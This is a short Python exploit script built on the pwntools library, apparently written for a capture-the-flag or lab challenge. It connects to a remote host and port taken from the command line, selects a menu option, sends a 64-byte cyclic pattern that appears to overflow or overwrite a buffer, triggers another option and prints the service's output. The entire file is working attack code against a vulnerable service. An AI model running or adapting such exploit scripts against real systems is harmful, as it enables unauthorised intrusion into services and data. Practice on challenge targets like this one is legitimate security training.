from pwn import process, cyclic


def exploit(io: process):
    io.recvuntil(b"Enter your choice: ")
    io.sendline(b"2")
    io.recv()
    io.sendline(bytes(cyclic(64)))
    io.recvuntil(b"Enter your choice: ")
    io.sendline(b"4")


if __name__ == "__main__":
    import sys
    from pwn import context, remote

    context.log_level = "debug"

    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        exit()

    try:
        io = remote(sys.argv[1], int(sys.argv[2]))
    except Exception:
        exit()

    exploit(io)

    try:
        print(io.recvall().decode(errors="ignore"))
    except EOFError:
        raise EOFError("Failed to receive all output.")
